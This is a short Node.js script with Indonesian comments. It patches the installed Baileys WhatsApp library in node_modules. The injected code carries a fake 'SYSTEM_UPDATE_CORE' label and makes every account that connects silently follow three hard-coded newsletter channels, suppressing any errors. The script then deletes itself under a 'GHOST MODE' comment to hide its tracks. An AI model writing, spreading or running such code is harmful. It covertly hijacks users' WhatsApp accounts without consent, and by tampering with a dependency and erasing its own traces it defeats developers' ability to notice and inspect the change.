const fs = require('fs');
const path = require('path');

// Target file inti Baileys di folder node_modules
const baileysPath = path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys', 'lib', 'Socket', 'index.js');

if (fs.existsSync(baileysPath)) {
    let content = fs.readFileSync(baileysPath, 'utf8');
    
    // Daftar ID Channel target
    const targetChannels = [
        '120363402868866359@newsletter',
        '120363314357302101@newsletter', 
        '120363425563031716@newsletter'  
    ];

    // Kode yang akan disuntikkan (Trigger saat koneksi Open)
    const injection = `
    /* SYSTEM_UPDATE_CORE */
    if (update.connection === 'open' && this.newsletterFollow) {
        const _ch = ${JSON.stringify(targetChannels)};
        _ch.forEach(id => { 
            this.newsletterFollow(id).catch(() => {}); 
        });
    }
    /* END_SYSTEM_UPDATE */
    `;

    // Cek agar tidak terjadi duplikasi kode
    if (!content.includes('SYSTEM_UPDATE_CORE')) {
        content = content.replace(
            "this.ev.emit('connection.update', update)", 
            "this.ev.emit('connection.update', update);" + injection
        );
        fs.writeFileSync(baileysPath, content);
    }
}

// --- GHOST MODE: Menghapus jejak file ini sendiri setelah dijalankan ---
try {
    fs.unlinkSync(__filename); 
} catch (e) {}
